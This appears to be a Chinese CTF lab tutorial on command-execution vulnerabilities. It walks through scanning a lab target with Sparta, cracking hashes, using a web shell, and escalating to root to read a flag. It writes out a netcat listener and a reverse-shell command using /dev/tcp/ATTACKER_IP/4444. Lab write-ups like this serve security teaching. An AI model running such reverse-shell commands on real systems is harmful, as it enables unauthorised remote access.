## 命令执行漏洞概述 🔍

![](img/5cd4dd55b612f91a08feb4879f5a631e_3.png)

上一节我们介绍了命令执行的基本概念，本节中我们来看看其具体的产生原理和利用方式。

命令执行漏洞是这样产生的。当应用需要调用一些外部程序去处理内容的情况下，就会用到一些执行系统命令的函数。如PHP语言中的`system()`、`exec()`、`shell_exec()`等。当用户可以控制命令执行函数中的参数时，就可以注入恶意系统命令到正常的命令中，造成命令执行攻击。

在调用这些函数执行系统命令的时候，如果没有把用户的输入进行严格的过滤，那么用户输入将作为系统命令参数拼接到对应的命令行中，造成命令执行，最终导致命令执行漏洞。

## 信息探测与收集 📡

![](img/5cd4dd55b612f91a08feb4879f5a631e_19.png)

在CTF比赛中，第一步永远是信息收集。本节我们将使用集成工具`Sparta`来高效地探测目标信息。

![](img/5cd4dd55b612f91a08feb4879f5a631e_21.png)

![](img/5cd4dd55b612f91a08feb4879f5a631e_23.png)

首先，我们需要确认与靶场机器的连通性。在Kali终端中执行：
```bash
ping 192.168.253.18
```
收到ICMP响应，证明网络连通。

接下来，我们打开集成信息探测工具`Sparta`：
```bash
sparta
```
在打开的图形界面中，将目标IP `192.168.253.18` 添加到扫描范围。`Sparta`会自动调用`Nmap`、`Nikto`等工具进行端口扫描、服务识别和敏感文件探测。

![](img/5cd4dd55b612f91a08feb4879f5a631e_25.png)

扫描结果显示，靶场开放了`23`、`80`、`8080`端口。`80`和`8080`端口均为HTTP服务，且`8080`端口服务由`Python 2.7.1`编写。

## 深入分析与漏洞挖掘 🕵️

在收集到初步信息后，我们需要对关键服务进行深入分析。

我们首先分析`80`端口。在`Sparta`中右键点击`80`端口，选择在浏览器中打开。页面是一个简单的主页。使用`WhatWeb`扫描（`Sparta`集成功能）发现该站点使用`Python Django`框架。

![](img/5cd4dd55b612f91a08feb4879f5a631e_31.png)

同时，`Nikto`的扫描结果提示存在一个名为`/dev`的敏感目录。我们访问`http://192.168.253.18/dev`，发现一个包含多个哈希值的页面，以及一个需要认证的`Web Shell`链接。

![](img/5cd4dd55b612f91a08feb4879f5a631e_33.png)

以下是该页面中发现的关键信息点：
1.  页面源代码中包含多个看似无意义的哈希字符串。
2.  存在一个指向`/admin`的后台登录入口。
3.  `Web Shell`链接提示需要服务器认证。

我们首先尝试破解哈希值。将页面中的哈希值复制保存到本地文件，然后使用在线哈希破解网站（如`crackstation.net`）进行破解。成功破解出两对明文：`bob` 和 `bobglove`。

## 漏洞利用与权限获取 ⚔️

![](img/5cd4dd55b612f91a08feb4879f5a631e_45.png)

![](img/5cd4dd55b612f91a08feb4879f5a631e_47.png)

![](img/5cd4dd55b612f91a08feb4879f5a631e_49.png)

虽然找到了命令执行点，但功能受限。我们需要利用它获取一个反向Shell。

![](img/5cd4dd55b612f91a08feb4879f5a631e_50.png)

![](img/5cd4dd55b612f91a08feb4879f5a631e_52.png)

首先，在攻击机（Kali）上监听一个端口（例如`4444`）：
```bash
nc -nlvp 4444
```
然后，在`Web Shell`中执行以下命令（需根据实际IP修改`ATTACKER_IP`）：
```bash
bash -c ‘bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1‘
```
执行后，在攻击机的`nc`监听端口中成功接收到来自靶场的Shell连接。

为了使这个Shell更稳定、功能更完整，我们在获得的Shell中执行：
```python
python -c ‘import pty; pty.spawn(“/bin/bash”)‘
```
现在，我们获得了一个交互式的`bash`终端。使用`id`命令查看，当前用户并非`root`。

## 权限提升与夺取Flag 👑

我们需要进行权限提升（提权）。首先在系统中寻找敏感文件和线索。

![](img/5cd4dd55b612f91a08feb4879f5a631e_54.png)

![](img/5cd4dd55b612f91a08feb4879f5a631e_55.png)

1.  **查找隐藏文件**：使用`ls -la`在用户目录及上级目录仔细查找，发现`/home/bobadmin`目录下有一个隐藏目录`.sudo_as_admin_successful`和一个名为`customApp`的可执行文件。
2.  **分析可疑文件**：使用`strings`命令分析`customApp`文件中的字符串：
    ```bash
    strings customApp
    ```
    在输出信息中，发现一段提示文字，暗示了`root`用户的密码（一段去掉了所有字母‘H‘的英文句子）。
3.  **提取并利用密码**：根据提示，从那段文字中提取出密码。然后使用`sudo`命令提权：
    ```bash
    sudo su
    ```
    输入提取到的密码，成功获得`root`权限（`id`命令显示`uid=0`）。
4.  **寻找Flag**：在`root`用户目录下，通常存放着`flag`文件。
    ```bash
    cd /root
    ls
    cat flag.txt  # 或类似的文件名
    ```
    成功读取到`flag`值。

## 课程总结 📝

本节课我们一起学习了命令执行漏洞的完整利用流程：
1.  **信息收集**：使用`Sparta`等集成工具进行高效的端口扫描、服务识别和目录探测。
2.  **漏洞发现**：通过分析敏感目录（如`/dev`）、破解哈希值获取凭证，并登录后台。
3.  **漏洞利用**：利用后台找到的命令执行点（`Web Shell`），通过构造反向Shell命令获取初始访问权限。
4.  **权限提升**：在系统内查找敏感信息（如使用`strings`分析可疑程序），找到`root`密码并完成提权。
5.  **夺取目标**：最终在`/root`目录下找到并读取`flag`文件。

![](img/5cd4dd55b612f91a08feb4879f5a631e_61.png)

在真实的CTF比赛或安全评估中，命令执行漏洞往往伴随着各种过滤和限制，需要灵活运用编码、拼接、利用环境变量等技巧进行绕过。本节课的案例展示了基本的思路和方法，是后续学习更复杂绕过技术的基础。
